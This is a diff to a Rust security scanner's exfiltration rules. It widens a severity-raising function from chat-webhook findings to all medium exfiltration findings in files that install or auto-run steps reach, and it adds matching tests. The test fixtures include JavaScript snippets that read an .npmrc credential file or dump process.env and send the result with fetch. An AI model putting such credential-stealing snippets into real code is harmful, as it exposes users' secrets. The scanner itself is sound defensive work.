@@ -7,6 +7,7 @@ use regex::Regex;
 use super::hidden::{
     Hits, Rule, cached, in_comment, is_script, is_test_path, lines_around, report,
 };
+use crate::scan::ReachedTest;
 use crate::{FileCtx, FileKind, Finding, Group, Lang, Severity};
 
 // The patterns spell their dots as `[.]` and break up their own keywords, so this file does not
@@ -206,13 +207,15 @@ fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
     emit(f, text, &hits, &rule, out);
 }
 
-/// Raises the chat-webhook findings of files that an auto-run surface reaches to HIGH: a script
-/// that runs on install and posts to a chat service is not a bot. The orchestrator calls this once
-/// with the set of reached paths and the findings it collected; other rules are not touched.
-pub(crate) fn raise_reached_webhooks(findings: &mut [Finding], reached: &dyn Fn(&str) -> bool) {
+/// Raises every MEDIUM `exfil.*` finding of a file that an auto-run surface reaches to HIGH. The
+/// test-path and comment caps, and the chat-webhook ruling, exist for files that only sit in the
+/// tree: a script that runs on install and posts to a chat service, or reads `.npmrc` from a file
+/// under `test/`, is not a bot or a fixture. The orchestrator calls this once with the set of
+/// reached paths and the findings it collected; other groups are not touched.
+pub(crate) fn raise_reached(findings: &mut [Finding], reached: &ReachedTest<'_>) {
     for finding in findings
         .iter_mut()
-        .filter(|x| x.rule == "exfil.webhook" && x.severity == Severity::Medium)
+        .filter(|x| x.group == Group::Exfil && x.severity == Severity::Medium)
     {
         if reached(&finding.path) {
             finding.severity = Severity::High;
@@ -774,26 +777,49 @@ mod tests {
         let t = format!("fetch('{DISCORD}');\n");
         let mut v = code(Lang::Js, &t);
         assert_eq!(one(&v, "exfil.webhook").severity, Severity::Medium);
-        raise_reached_webhooks(&mut v, &|path| path == "src/a.file");
+        raise_reached(&mut v, &|path| path == "src/a.file");
         assert_eq!(one(&v, "exfil.webhook").severity, Severity::High);
-        // A file no auto-run surface reaches stays MEDIUM; other rules are not touched.
+        // A file no auto-run surface reaches stays MEDIUM.
         let mut v = code(Lang::Js, &t);
-        raise_reached_webhooks(&mut v, &|path| path == "other.js");
+        raise_reached(&mut v, &|path| path == "other.js");
         assert_eq!(one(&v, "exfil.webhook").severity, Severity::Medium);
-        let mut v = code(Lang::Js, "x = 1;\nconst y = 'xmr' + 'ig';\n");
-        v.push(Finding {
+    }
+
+    #[test]
+    fn a_reached_file_loses_the_test_path_and_comment_caps() {
+        // A test-folder script that reads and sends a credential is MEDIUM on its own and HIGH
+        // when something runs it; so is an environment dump and a comment-only mention.
+        let t = format!(
+            "const k = fs.readFileSync('{NPMRC}');\nfetch(u, {{ body: k }});\nconst e = JSON.stringify(process.env);\nfetch(u, {{ body: e }});\n"
+        );
+        let mut v = run("test/x.js", FileKind::Code(Lang::Js), &t);
+        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
+        assert_eq!(one(&v, "exfil.env-dump").severity, Severity::Medium);
+        raise_reached(&mut v, &|path| path == "test/x.js");
+        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::High);
+        assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High);
+        let c = format!("// reads {NPMRC}\nfetch(u);\n");
+        let mut v = run("src/c.js", FileKind::Code(Lang::Js), &c);
+        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
+        raise_reached(&mut v, &|_| true);
+        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::High);
+    }
+
+    #[test]
+    fn raising_a_reached_file_touches_only_medium_exfil_findings() {
+        let mut mediums = vec![Finding {
             severity: Severity::Medium,
-            group: Group::Exfil,
-            rule: "exfil.cred-path".to_string(),
+            group: Group::Hidden,
+            rule: "hidden.zero-width".to_string(),
             path: "src/a.file".to_string(),
             line: 1,
             why: String::new(),
             seen: String::new(),
             action: String::new(),
             count: 1,
-        });
-        raise_reached_webhooks(&mut v, &|_| true);
-        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
+        }];
+        raise_reached(&mut mediums, &|_| true);
+        assert_eq!(mediums[0].severity, Severity::Medium);
     }
 
     #[test]
